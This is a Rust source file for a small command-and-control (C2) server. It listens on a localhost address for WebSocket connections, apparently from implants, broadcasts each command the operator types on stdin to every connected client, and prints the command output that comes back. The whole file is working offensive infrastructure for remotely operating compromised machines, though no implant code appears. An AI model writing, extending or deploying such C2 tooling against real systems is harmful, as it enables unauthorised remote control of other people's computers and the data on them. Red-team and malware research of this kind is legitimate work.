mod c2s;
mod constants;
mod utils;

use constants::localhost::{LOCALHOST_ADDRESS, LOCALHOST_PORT};
use futures_util::{SinkExt, StreamExt};
use tokio::{
    io::{self, AsyncBufReadExt},
    net::TcpListener,
    signal,
    sync::broadcast,
};
use tokio_tungstenite::accept_async;

#[tokio::main]
async fn main() {
    let addr = format!("{}:{}", LOCALHOST_ADDRESS, LOCALHOST_PORT);

    let listener = TcpListener::bind(&addr).await.expect("Failed to bind");
    println!("Listening on: {}", addr);

    let (tx, _rx) = broadcast::channel(10);

    let listener_tx = tx.clone();
    tokio::spawn(async move {
        while let Ok((stream, _)) = listener.accept().await {
            let tx = listener_tx.clone();
            let rx = tx.subscribe();
            tokio::spawn(async move {
                let _ = handle_connection(stream, rx).await;
            });
        }
    });

    tokio::spawn({
        let tx = tx.clone();
        async move {
            let mut stdin = io::BufReader::new(io::stdin()).lines();

            while let Ok(Some(command)) = stdin.next_line().await {
                println!("Sending command: {}", command);
                tx.send(command).unwrap();
            }
        }
    });

    tokio::select! {
        _ = signal::ctrl_c() => {
            println!("Ctrl+C received, shutting down...");
        }
    }

    println!("C2 server has been shut down.");
}

async fn handle_connection(stream: tokio::net::TcpStream, mut rx: broadcast::Receiver<String>) {
    let ws_stream = accept_async(stream)
        .await
        .expect("Error during WebSocket handshake");

    let (mut ws_sender, mut ws_receiver) = ws_stream.split();

    tokio::spawn(async move {
        while let Ok(command) = rx.recv().await {
            if let Err(e) = ws_sender
                .send(tokio_tungstenite::tungstenite::Message::Text(command))
                .await
            {
                eprintln!("Failed to send command: {}", e);
            }
        }
    });

    while let Some(msg) = ws_receiver.next().await {
        match msg.unwrap().to_text() {
            Ok(m) => {
                if m.is_empty() {
                    println!(
                        "Command output did not contain any data. Check for the desired output."
                    );
                } else {
                    println!("Received message:\n{}", m);
                }
            }
            Err(e) => {
                eprintln!("Error receiving message: {}", e);
                break;
            }
        };
    }
}
